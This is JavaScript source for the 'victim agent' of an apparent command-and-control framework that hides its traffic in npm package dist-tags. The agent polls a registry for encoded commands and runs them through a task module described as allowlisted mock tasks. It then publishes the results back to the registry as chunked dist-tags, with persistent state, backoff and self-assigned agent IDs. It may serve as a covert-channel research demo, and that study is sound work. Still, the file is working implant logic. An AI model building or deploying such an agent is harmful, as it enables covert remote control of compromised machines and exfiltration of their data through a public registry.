// Victim agent: polls dist-tags on a package, executes allowlisted mock tasks
// addressed to it (or to 'all'), and publishes chunked results as dist-tags.
//
// Guarantees:
//  - each command executes AT MOST ONCE (state.lastSeq is persisted before the
//    result is published, and survives restarts via the state file)
//  - malformed tags are logged and skipped, never fatal
//  - registry failures only slow the loop down (exponential backoff); the
//    agent keeps polling
//  - SIGINT/SIGTERM flush state and exit cleanly

import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { pathToFileURL } from 'node:url';
import { loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  decodeCommandTag,
  encodeResultTags,
  isCommandTag,
} from '../common/protocol.js';
import { RegistryClient } from '../common/registry.js';
import { runTask } from './tasks.js';

const MAX_BACKOFF_SEC = 300;

// ---------------------------------------------------------------------------
// state file
// ---------------------------------------------------------------------------

export function defaultState() {
  return { agentId: '', lastSeq: {} };
}

export function loadState(statePath) {
  try {
    const raw = JSON.parse(fs.readFileSync(statePath, 'utf8'));
    return {
      agentId: typeof raw.agentId === 'string' ? raw.agentId : '',
      lastSeq: raw.lastSeq && typeof raw.lastSeq === 'object' ? raw.lastSeq : {},
    };
  } catch {
    return defaultState();
  }
}

export function saveState(statePath, state) {
  const tmp = `${statePath}.tmp`;
  fs.mkdirSync(path.dirname(path.resolve(statePath)), { recursive: true });
  fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
  fs.renameSync(tmp, statePath); // atomic-ish: never leave a half-written state file
}

// ---------------------------------------------------------------------------
// command selection (pure, testable)
// ---------------------------------------------------------------------------

/**
 * Pick the commands that should be executed from a dist-tag map.
 * Returns them sorted by sequence number. Malformed tags are reported in
 * `skipped` instead of throwing.
 */
export function selectCommands(distTags, state, agentId) {
  const commands = [];
  const skipped = [];
  for (const name of Object.keys(distTags)) {
    if (!isCommandTag(name)) continue;
    let cmd;
    try {
      cmd = decodeCommandTag(name);
    } catch (err) {
      skipped.push({ tag: name, reason: err.message });
      continue;
    }
    if (cmd.agentId !== agentId && cmd.agentId !== 'all') continue;
    const last = state.lastSeq[cmd.agentId] ?? 0;
    if (cmd.seq <= last) continue; // already processed (dedup)
    commands.push({ tag: name, ...cmd });
  }
  commands.sort((a, b) => a.seq - b.seq);
  return { commands, skipped };
}

// ---------------------------------------------------------------------------
// one poll cycle (testable with a fake client)
// ---------------------------------------------------------------------------

/**
 * @param {object} deps
 * @param {Record<string,string>} deps.distTags current dist-tag map
 * @param {object} deps.state agent state (mutated)
 * @param {string} deps.agentId this agent's id
 * @param {object} deps.client RegistryClient (or fake with setDistTag)
 * @param {object} deps.logger
 * @param {Function} [deps.save] persist callback, called after each state change
 * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
 */
export async function processDistTags({ distTags, state, agentId, client, logger, save }) {
  const { commands, skipped } = selectCommands(distTags, state, agentId);
  for (const s of skipped) {
    logger.warn(`skipping malformed tag "${s.tag}": ${s.reason}`);
  }

  let resultsPublished = 0;
  for (const cmd of commands) {
    logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
    const result = runTask(cmd.payload.op, cmd.payload.args ?? {});
    const resultPayload = {
      seq: cmd.seq,
      op: cmd.payload.op,
      ok: result.ok,
      output: result.output,
      error: result.error,
      ts: Date.now(),
    };

    // Mark processed BEFORE publishing: if the publish fails we would rather
    // lose a result than execute a command twice.
    state.lastSeq[cmd.agentId] = cmd.seq;
    if (save) save();

    try {
      const tags = encodeResultTags(agentId, cmd.seq, resultPayload);
      for (const tag of tags) {
        await client.setDistTag(tag, PINNED_VERSION);
      }
      resultsPublished++;
      logger.info(
        `result for seq ${cmd.seq} published as ${tags.length} tag(s) (ok=${result.ok})`,
      );
    } catch (err) {
      logger.error(`failed to publish result for seq ${cmd.seq}: ${err.message}`);
    }
  }

  return { executed: commands.length, resultsPublished, skipped: skipped.length };
}

// ---------------------------------------------------------------------------
// main loop
// ---------------------------------------------------------------------------

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
  });
  const statePath = cfg.stateFile || 'victim-state.json';
  const state = loadState(statePath);
  const save = () => saveState(statePath, state);

  if (cfg.agentId) {
    state.agentId = cfg.agentId;
  }
  if (!state.agentId) {
    state.agentId = 'a' + crypto.randomBytes(4).toString('hex');
    logger.info(`generated new agentId: ${state.agentId}`);
  }
  save();

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });

  logger.info(`victim agent ${state.agentId} starting`);
  logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
  if (!cfg.token) {
    logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
  }

  let running = true;
  const shutdown = (signal) => {
    logger.info(`received ${signal}, shutting down`);
    running = false;
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  let consecutiveFailures = 0;
  while (running) {
    let delaySec = cfg.pollIntervalSec;
    try {
      const distTags = await client.getDistTags();
      consecutiveFailures = 0;
      const stats = await processDistTags({
        distTags,
        state,
        agentId: state.agentId,
        client,
        logger,
        save,
      });
      if (stats.executed > 0 || stats.skipped > 0) {
        logger.info('cycle summary', stats);
      }
    } catch (err) {
      consecutiveFailures++;
      delaySec = Math.min(cfg.pollIntervalSec * 2 ** consecutiveFailures, MAX_BACKOFF_SEC);
      logger.error(
        `poll cycle failed (${consecutiveFailures} consecutive): ${err.message} — retrying in ${delaySec}s`,
      );
    }
    // sleep in small slices so SIGINT exits promptly
    for (let slept = 0; running && slept < delaySec * 1000; slept += 200) {
      await sleep(Math.min(200, delaySec * 1000 - slept));
    }
  }

  save();
  logger.close();
  process.exit(0);
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
